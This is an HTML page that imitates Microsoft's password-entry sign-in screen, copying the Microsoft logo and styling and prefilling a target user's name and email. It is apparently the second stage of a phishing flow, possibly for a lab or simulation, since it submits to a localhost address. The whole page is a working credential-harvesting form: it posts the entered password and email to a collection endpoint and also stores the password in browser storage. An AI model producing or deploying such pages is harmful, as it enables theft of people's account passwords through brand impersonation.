<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Microsoft Sign-In</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{background:#f2f2f2;font-family:'Segoe UI',Arial,sans-serif;}
.wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
.box{background:#fff;width:100%;max-width:440px;padding:44px 44px 32px;}
.logo{margin-bottom:16px;}
.avatar{width:52px;height:52px;border-radius:50%;background:#0067b8;display:flex;align-items:center;justify-content:center;color:#fff;font-size:22px;font-weight:600;margin-bottom:10px;}
.uname{font-size:15px;font-weight:600;color:#1b1b1b;}
.uemail{font-size:12px;color:#605e5c;margin-bottom:16px;}
.title{font-size:20px;font-weight:600;color:#1b1b1b;margin-bottom:12px;}
.lbl{font-size:12px;color:#605e5c;margin-bottom:3px;display:block;}
.field{border-bottom:1px solid #8a8886;margin-bottom:6px;}
.field:focus-within{border-bottom:2px solid #0067b8;}
.field.err{border-bottom:2px solid #a4262c;}
input[type=password]{width:100%;border:none;font-size:15px;outline:none;background:transparent;color:#1b1b1b;padding:6px 0;}
.errmsg{font-size:12px;color:#a4262c;margin-bottom:8px;display:none;align-items:center;gap:4px;}
.errmsg.show{display:flex;}
.link{font-size:13px;color:#0067b8;text-decoration:none;display:block;margin:8px 0;cursor:pointer;}
.divider{border:none;border-top:1px solid #e6e6e6;margin:14px 0;}
.row{display:flex;justify-content:space-between;align-items:center;margin-top:8px;}
.btn{background:#0067b8;color:#fff;border:none;padding:8px 20px;font-size:14px;font-weight:600;cursor:pointer;}
.btn:hover{background:#005a9e;}
.btn-back{background:transparent;color:#0067b8;border:1px solid #0067b8;padding:8px 20px;font-size:14px;font-weight:600;cursor:pointer;}
.footer{display:flex;gap:14px;margin-top:16px;}
.footer a{font-size:11px;color:#605e5c;text-decoration:none;}
</style>
</head>
<body>
<div class="wrap">
<div class="box">
  <div class="logo">
    <svg width="108" height="22" viewBox="0 0 108 22">
      <rect x="0" y="0" width="9" height="9" fill="#F25022"/>
      <rect x="10" y="0" width="9" height="9" fill="#7FBA00"/>
      <rect x="0" y="10" width="9" height="9" fill="#00A4EF"/>
      <rect x="10" y="10" width="9" height="9" fill="#FFB900"/>
      <text x="24" y="16" font-family="Segoe UI,Arial" font-size="14" font-weight="600" fill="#1b1b1b">Microsoft</text>
    </svg>
  </div>
  <div class="avatar" id="av">J</div>
  <div class="uname" id="uname">James Okafor</div>
  <div class="uemail" id="uemail">james@labcorp.local</div>
  <div class="title">Enter password</div>
  <form method="POST" action="http://127.0.0.1:8081/stage2/submit" id="frm2">
    <input type="hidden" name="email" id="h-email"/>
    <span class="lbl">Password</span>
    <div class="field" id="fw2">
      <input type="password" name="password" id="pw" placeholder="Password"/>
    </div>
    <div class="errmsg" id="errmsg2">
      <svg width="14" height="14" viewBox="0 0 14 14"><circle cx="7" cy="7" r="6" fill="#a4262c"/><path d="M7 4v3.5M7 9.2v.3" stroke="white" stroke-width="1.3" stroke-linecap="round"/></svg>
      Password cannot be empty
    </div>
    <a class="link">Forgot password?</a>
    <div class="divider"></div>
    <div class="row">
      <button type="button" class="btn-back" onclick="history.back()">Back</button>
      <button type="button" class="btn" onclick="go2()">Sign in</button>
    </div>
  </form>
  <div class="footer">
    <a href="#">Terms of use</a>
    <a href="#">Privacy &amp; cookies</a>
  </div>
</div>
</div>
<script>
var email = new URLSearchParams(window.location.search).get('email') || localStorage.getItem('ms_email') || 'user@example.com';
document.getElementById('av').textContent = email.charAt(0).toUpperCase();
document.getElementById('uemail').textContent = email;
document.getElementById('h-email').value = email;
function go2(){
  var pw=document.getElementById('pw').value;
  var fw=document.getElementById('fw2');
  var err=document.getElementById('errmsg2');
  if(!pw){fw.classList.add('err');err.classList.add('show');return;}
  fw.classList.remove('err');err.classList.remove('show');
  localStorage.setItem('ms_pass', pw);
  document.getElementById('frm2').submit();
}
</script>
</body>
</html>
